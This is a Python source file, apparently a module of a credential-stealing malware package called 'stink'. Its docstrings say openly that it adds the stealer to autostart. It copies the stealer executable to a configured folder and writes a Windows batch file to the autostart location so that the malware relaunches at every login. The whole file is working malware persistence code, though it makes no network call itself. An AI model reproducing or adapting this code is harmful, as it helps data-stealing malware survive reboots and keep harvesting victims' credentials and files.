from os import path
from shutil import copyfile

from stink.helpers.config import AutostartConfig


class Autostart:
    """
    Adds the stealer to autostart.
    """
    def __init__(self, executor_path: str):

        self.__executor_path = executor_path
        self.__config = AutostartConfig()

    def __create_copy(self) -> None:
        """
        Creates a copy of the stealer.
        :return: None
        """
        self.executor_name = self.__executor_path.replace("\\", "/").split("/")[-1]
        copyfile(self.__executor_path, path.join(self.__config.ExecutorPath, self.executor_name))

    def __add_to_autostart(self) -> None:
        """
        Adds the stealer to autostart.
        :return: None
        """
        with open(rf"{self.__config.AutostartPath}\{self.__config.AutostartName}.bat", "w+") as file:
            file.write(f'@echo off\nstart "{self.__config.AutostartName}" "{self.__config.ExecutorPath}\\{self.executor_name}"')

        file.close()

    def run(self) -> None:
        """
        Launches the autostart module.
        :return: None
        """
        try:

            self.__create_copy()
            self.__add_to_autostart()

        except Exception as e:
            print(f"[Autostart]: {repr(e)}")
